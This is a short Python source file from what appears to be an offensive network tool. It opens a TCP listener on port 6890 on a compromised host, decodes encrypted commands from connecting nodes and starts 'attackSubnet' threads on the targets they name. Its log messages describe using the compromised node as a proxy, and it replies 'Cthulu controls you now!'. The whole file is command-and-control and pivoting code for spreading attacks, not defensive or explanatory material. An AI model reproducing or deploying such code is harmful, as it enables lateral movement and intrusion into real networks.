import socket
import threading
from TrivialFunctions import *
from Attack import *
from Cypher import *
import constants
import pprint
pp = pprint.PrettyPrinter(indent=4)

def handle_client(client_socket, client_ip):
    try:
    # print out what the client sends
        request = client_socket.recv(1024)
        decodedRequest = decode(constants.key,request.decode("utf-8"))
        output(1, "step", "Request decoded!")
        threading.Thread(target=attackSubnet, args=(decodedRequest,)).start()
    except:
        output(1, "error", "No data was transmitted")
    # send back a packet
    output(1, "info", "Using the compromised node as a proxy")
    client_socket.send(encode(constants.key,"Cthulu controls you now!"))
    client_socket.close()


def startTunnel():
    bind_ip = "0.0.0.0"
    bind_port = 6890

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(5)

    output(1, "step", "Listening on %s:%d" % (bind_ip, bind_port))

    while True:
        client, addr = server.accept()

        output(1, "success", "Connection from node: %s:%d" % (addr[0], addr[1]))

        # spin up our client thread to handle incoming data
        client_handler = threading.Thread(target=handle_client, args=(client, addr[0]))
        client_handler.start()
